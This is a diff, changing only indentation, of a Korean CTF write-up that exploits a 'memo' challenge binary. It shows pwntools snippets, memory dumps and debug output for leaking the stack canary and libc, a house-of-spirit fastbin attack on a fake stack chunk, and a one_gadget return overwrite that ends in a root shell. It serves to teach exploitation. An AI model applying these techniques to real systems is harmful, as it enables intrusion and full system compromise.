@@ -128,123 +128,123 @@ malloc() -> 0x10: 00000000 00000000 00000000 00000000
 
 # Exploit
 1. 스택 주소와 canary leak  
-
-```
-0x7fff04a4d1c0: 0x0000000000000000      0x0000000000000000
-0x7fff04a4d1d0: 0x0000000000400e20      0x0000000000400870
-0x7fff04a4d1e0: 0x00007fff04a4d2d0      0x136fe51ca293f100
-0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
-
-0x7fff04a4d1e0 -> buf+0x110
-0x7fff04a4d1e8 -> canary
-```
-`read()` 하기 직전의 `buf` 의 모습이다.  
-`0x20` 만큼 데이터를 넣으면 `strdup()` 의 `strlen()` 이 길이를 잘못 재서 뒤의 데이터도 딸려온다.  
-```
-    alloc('A'*0x20)
-    buf = show(0x20) - 0x110
-
-0x20d1000:      0x0000000000000000      0x0000000000000031
-0x20d1010:      0x4141414141414141      0x4141414141414141
-0x20d1020:      0x4141414141414141      0x4141414141414141
-0x20d1030:      0x00007fff04a4d2d0      0x0000000000020fd1
-```
-이제 출력시키면 된다.  
-```
-[DEBUG] Received 0x2d bytes:
-    00000000  44 61 74 61  3a 20 41 41  41 41 41 41  41 41 41 41  │Data│: AA│AAAA│AAAA│
-    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
-    00000020  41 41 41 41  41 41 d0 d2  a4 04 ff 7f  0a           │AAAA│AA··│····│·│
-    0000002d
-[+] Buffer: 0x7fff04a4d1c0
-```
-  
-`canary` 도 똑같은 방법으로 leak 하면 된다.  
-  
+	
+	```
+	0x7fff04a4d1c0: 0x0000000000000000      0x0000000000000000
+	0x7fff04a4d1d0: 0x0000000000400e20      0x0000000000400870
+	0x7fff04a4d1e0: 0x00007fff04a4d2d0      0x136fe51ca293f100
+	0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
+	
+	0x7fff04a4d1e0 -> buf+0x110
+	0x7fff04a4d1e8 -> canary
+	```
+	`read()` 하기 직전의 `buf` 의 모습이다.  
+	`0x20` 만큼 데이터를 넣으면 `strdup()` 의 `strlen()` 이 길이를 잘못 재서 뒤의 데이터도 딸려온다.  
+	```
+	    alloc('A'*0x20)
+	    buf = show(0x20) - 0x110
+	
+	0x20d1000:      0x0000000000000000      0x0000000000000031
+	0x20d1010:      0x4141414141414141      0x4141414141414141
+	0x20d1020:      0x4141414141414141      0x4141414141414141
+	0x20d1030:      0x00007fff04a4d2d0      0x0000000000020fd1
+	```
+	이제 출력시키면 된다.  
+	```
+	[DEBUG] Received 0x2d bytes:
+	    00000000  44 61 74 61  3a 20 41 41  41 41 41 41  41 41 41 41  │Data│: AA│AAAA│AAAA│
+	    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+	    00000020  41 41 41 41  41 41 d0 d2  a4 04 ff 7f  0a           │AAAA│AA··│····│·│
+	    0000002d
+	[+] Buffer: 0x7fff04a4d1c0
+	```
+	  
+	`canary` 도 똑같은 방법으로 leak 하면 된다.  
+	  
 2. GOT leak  
-
-```
-    giveup('no'.ljust(24,'\x00')+p64(memo.got['puts']))
-    libc = show(0) - elf.symbols['puts']
-
-0x7fff04a4d1c0: 0x0000000000006f6e      0x0000000000000000
-0x7fff04a4d1d0: 0x0000000000000000      0x0000000000601f90 <- puts@GOT
-0x7fff04a4d1e0: 0x4242424242424242      0x136fe51ca293f142
-0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
-```
-메뉴 4번으로 `(&buf + 0x18)` 을 `puts@GOT` 로 바꾸고 출력해주면  
-```
-.text:0000000000400C6B <dump+16>       mov     rsi, rax
-.text:0000000000400C6E <dump+19>       mov     edi, offset aDataS ; "Data: %s\n"
-.text:0000000000400C73 <dump+24>       mov     eax, 0
-.text:0000000000400C78 <dump+29>       call    printf
-
-RDI  0x400f85 ◂— 'Data: %s\n'
-RSI  0x601f90 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7f4af32e1170 (puts)
-```
-```
-[DEBUG] Received 0xd bytes:
-    00000000  44 61 74 61  3a 20 70 11  2e f3 4a 7f  0a           │Data│: p·│.·J·│·│
-    0000000d
-[+] Libc: 0x7f4af3277000
-```
-  
+	
+	```
+	    giveup('no'.ljust(24,'\x00')+p64(memo.got['puts']))
+	    libc = show(0) - elf.symbols['puts']
+	
+	0x7fff04a4d1c0: 0x0000000000006f6e      0x0000000000000000
+	0x7fff04a4d1d0: 0x0000000000000000      0x0000000000601f90 <- puts@GOT
+	0x7fff04a4d1e0: 0x4242424242424242      0x136fe51ca293f142
+	0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
+	```
+	메뉴 4번으로 `(&buf + 0x18)` 을 `puts@GOT` 로 바꾸고 출력해주면  
+	```
+	.text:0000000000400C6B <dump+16>       mov     rsi, rax
+	.text:0000000000400C6E <dump+19>       mov     edi, offset aDataS ; "Data: %s\n"
+	.text:0000000000400C73 <dump+24>       mov     eax, 0
+	.text:0000000000400C78 <dump+29>       call    printf
+	
+	RDI  0x400f85 ◂— 'Data: %s\n'
+	RSI  0x601f90 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7f4af32e1170 (puts)
+	```
+	```
+	[DEBUG] Received 0xd bytes:
+	    00000000  44 61 74 61  3a 20 70 11  2e f3 4a 7f  0a           │Data│: p·│.·J·│·│
+	    0000000d
+	[+] Libc: 0x7f4af3277000
+	```
+	  
 3. house of spirit  
-
-```
-    exp = 'no\x00'.ljust(8, 'C')
-    exp += p64(0x20)
-    exp += p64(0)
-    exp += p64(buf+0x10)
-    exp += p64(0)
-    exp += p64(0x1234)
-    giveup(exp)
-    delete()
-
-0x7fff04a4d1c0: 0x4343434343006f6e      0x0000000000000020 <- size
-0x7fff04a4d1d0: 0x0000000000000000      0x00007fff04a4d1d0 <- free()
-0x7fff04a4d1e0: 0x0000000000000000      0x0000000000001234 <- next size
-0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
-```
-```
-.text:0000000000400C88 <del+8>         mov     [rbp+ptr], rdi
-.text:0000000000400C8C <del+12>        mov     rax, [rbp+ptr]
-.text:0000000000400C90 <del+16>        mov     rdi, rax        ; ptr
-.text:0000000000400C93 <del+19>        call    free
-
-RDI  0x7fff04a4d1d0 ◂— 0x0
-```
-free() 할 주소가 스택이다.  
-```
-fastbins
-0x20: 0x7fff04a4d1c0 ◂— 0x0
-0x30: 0x0
-0x40: 0x0
-0x50: 0x0
-0x60: 0x0
-0x70: 0x0
-0x80: 0x0
-```
-이제 똑같이 `0x20` 만큼 할당하게 되면 fastbin 에서 가져오게 된다.  
-  
-```
-    alloc('D\x00', 'no\x00')
-    one_gadget = 0x40beb
-    r.sendafter('Data: ', '\x00'*24+p64(canary)+'EEEEEEEE'+p64(libc+one_gadget))
-
-0x7fff04a4d1c0: 0x4343434343000044      0x0000000000000020
-0x7fff04a4d1d0: 0x0000000000000000      0x0000000000000000
-0x7fff04a4d1e0: 0x0000000000000000      0x136fe51ca293f100
-0x7fff04a4d1f0: 0x4545454545454545      0x00007f4af32b7beb
-```
-RET 를 shell 떨구는 gadget 주소로 변조시켰다.  
-  
-```
-[+] Buffer: 0x7fff04a4d1c0
-[+] Canary: 0x136fe51ca293f100
-[+] Libc: 0x7f4af3277000
-Quitter!
-$ id
-uid=0(root) gid=0(root) groups=0(root)
-$
-```
+	
+	```
+	    exp = 'no\x00'.ljust(8, 'C')
+	    exp += p64(0x20)
+	    exp += p64(0)
+	    exp += p64(buf+0x10)
+	    exp += p64(0)
+	    exp += p64(0x1234)
+	    giveup(exp)
+	    delete()
+	
+	0x7fff04a4d1c0: 0x4343434343006f6e      0x0000000000000020 <- size
+	0x7fff04a4d1d0: 0x0000000000000000      0x00007fff04a4d1d0 <- free()
+	0x7fff04a4d1e0: 0x0000000000000000      0x0000000000001234 <- next size
+	0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
+	```
+	```
+	.text:0000000000400C88 <del+8>         mov     [rbp+ptr], rdi
+	.text:0000000000400C8C <del+12>        mov     rax, [rbp+ptr]
+	.text:0000000000400C90 <del+16>        mov     rdi, rax        ; ptr
+	.text:0000000000400C93 <del+19>        call    free
+	
+	RDI  0x7fff04a4d1d0 ◂— 0x0
+	```
+	free() 할 주소가 스택이다.  
+	```
+	fastbins
+	0x20: 0x7fff04a4d1c0 ◂— 0x0
+	0x30: 0x0
+	0x40: 0x0
+	0x50: 0x0
+	0x60: 0x0
+	0x70: 0x0
+	0x80: 0x0
+	```
+	이제 똑같이 `0x20` 만큼 할당하게 되면 fastbin 에서 가져오게 된다.  
+	  
+	```
+	    alloc('D\x00', 'no\x00')
+	    one_gadget = 0x40beb
+	    r.sendafter('Data: ', '\x00'*24+p64(canary)+'EEEEEEEE'+p64(libc+one_gadget))
+	
+	0x7fff04a4d1c0: 0x4343434343000044      0x0000000000000020
+	0x7fff04a4d1d0: 0x0000000000000000      0x0000000000000000
+	0x7fff04a4d1e0: 0x0000000000000000      0x136fe51ca293f100
+	0x7fff04a4d1f0: 0x4545454545454545      0x00007f4af32b7beb
+	```
+	RET 를 shell 떨구는 gadget 주소로 변조시켰다.  
+	  
+	```
+	[+] Buffer: 0x7fff04a4d1c0
+	[+] Canary: 0x136fe51ca293f100
+	[+] Libc: 0x7f4af3277000
+	Quitter!
+	$ id
+	uid=0(root) gid=0(root) groups=0(root)
+	$
+	```
